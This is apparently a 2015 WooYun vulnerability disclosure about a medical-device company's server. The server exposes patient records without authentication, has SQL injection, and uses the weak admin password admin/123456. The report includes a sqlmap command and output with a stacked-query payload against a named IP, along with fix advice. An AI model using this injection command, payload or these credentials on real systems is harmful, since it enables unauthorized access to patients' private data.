wybug_title: 神器而已之迈瑞某站配置不当及弱口令等问题导致不少病人信息泄露
wybug_detail:
漏洞详情 披露状态：   									2015-10-16：	细节已通知厂商并且等待厂商处理中									2015-10-19：	厂商已经确认，细节仅向厂商公开									2015-10-29：	细节向核心白帽子及相关领域专家公开									2015-11-08：	细节向普通白帽子公开									2015-11-18：	细节向实习白帽子公开									2015-12-03：	细节向公众公开  简要描述： RT 详细说明：  http://202.46.33.211:8090/PatientList.aspx某医疗设备的测试数据泄露后台未授权访问，导致病人数据泄露

同时存在sql注入
➜  sqlmap git:(master) ✗ python sqlmap.py -u "http://202.46.33.211:8090/DataList.aspx?guid=ba727e9912d62749a7a53acf3f359460&sNo=FW-57002419" -p sNo  --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-09c6f7e}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 16:33:29[16:33:29] [INFO] resuming back-end DBMS 'microsoft sql server' [16:33:29] [INFO] testing connection to the target URL[16:33:29] [WARNING] reflective value(s) found and filtering outsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: sNo (GET)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: guid=ba727e9912d62749a7a53acf3f359460&sNo=FW-57002419';WAITFOR DELAY '0:0:5'-----[16:33:29] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 or Vistaweb application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008


然后还有一个血压管理中心http://202.46.33.211/SystemMng/RoleMng.aspx账号密码是 admin/123456   漏洞证明：  

   修复方案：  1.后台数据加上认证2.修改弱口令3.修复注入   版权声明：转载请注明来源 举起手来@乌云
